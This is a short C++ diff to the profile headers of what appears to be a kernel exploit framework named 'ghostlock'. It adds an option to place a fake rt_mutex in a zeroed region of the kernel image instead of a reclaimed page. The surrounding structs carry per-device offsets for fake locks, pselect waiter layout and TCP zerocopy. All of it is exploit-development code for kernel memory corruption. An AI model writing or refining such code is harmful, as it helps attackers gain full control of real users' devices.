@@ -126,6 +126,11 @@ namespace ghostlock::profile {
         std::optional<uint32_t> mcast_buffer_size;
         std::optional<uint32_t> mcast_task_offset;
         std::optional<uint32_t> mcast_lock_offset;
+        /* Image-relative offset of a zero, writable, reference-free region used
+         * as the walk's fake rt_mutex instead of the reclaimed page. Absent =>
+         * the reclaimed page is used, i.e. the previous behaviour.
+         * See docs/analysis/payload-page-option2-plan.md. */
+        std::optional<uint64_t> select_lock_anchor_image;
     };
 
     /* Native transport representation of one Kotlin-resolved profile. */
@@ -154,6 +159,10 @@ namespace ghostlock::profile {
     struct SelectStackLayout {
         std::optional<int32_t> waiter_shift;
         std::optional<uint8_t> compact_waiter;
+        /* When present, the waiter's `lock` word carries this anchor (image
+         * offset) instead of fake_lock, so the walk's tree lives in a region we
+         * know is zero and nobody writes. */
+        std::optional<uint64_t> lock_anchor_image;
     };
 
     struct TcpZerocopyLayout {
@@ -294,6 +303,7 @@ namespace ghostlock::profile {
                        ? (SelectStackLayout){
                            .waiter_shift = values_.geometry.pselect_waiter_shift,
                            .compact_waiter = values_.misc.compact_waiter,
+                           .lock_anchor_image = values_.geometry.select_lock_anchor_image,
                        }
                        : SelectStackLayout{};
         }
